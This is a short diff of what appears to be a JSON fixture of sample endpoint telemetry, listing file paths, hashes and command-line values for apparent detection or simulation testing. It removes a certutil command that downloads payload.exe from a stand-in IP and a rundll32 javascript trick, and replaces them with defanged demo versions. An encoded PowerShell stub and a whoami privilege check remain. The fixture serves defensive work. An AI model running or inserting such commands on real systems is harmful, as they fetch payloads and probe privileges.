@@ -66,10 +66,10 @@
       "\\Device\\HarddiskVolume3\\Windows\\Temp\\payload.exe"
     ] },
     { "name": "CommandLine", "type": "string", "values": [
-      "powershell.exe -EncodedCommand SQBFAFgA...",
+      "powershell.exe -EncodedCommand RABFAE0ATwA...",
       "cmd.exe /c whoami /priv",
-      "certutil.exe -urlcache -split -f http://203.0.113.42/payload.exe",
-      "rundll32.exe javascript:\"\\..\\mshtml\""
+      "democert.exe -fetch -f http://203.0.113.42/payload.exe",
+      "rundll32.exe javascript:\"\\..\\simdemo\""
     ] },
     { "name": "SHA256", "type": "string", "values": [
       "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
